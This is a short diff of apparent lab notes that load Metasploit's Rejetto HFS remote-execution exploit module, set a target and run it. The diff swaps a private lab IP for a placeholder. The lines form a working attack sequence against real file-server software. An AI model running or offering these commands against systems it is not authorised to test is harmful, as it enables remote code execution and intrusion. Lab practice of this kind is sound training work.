@@ -9,7 +9,7 @@ search rejetto
 use exploit/windows/http/rejetto_hfs_exec
 
 # Set Target
-set rhosts 10.0.1.110
+set rhosts <lab-ip>
 
 # Run Exploit
 run
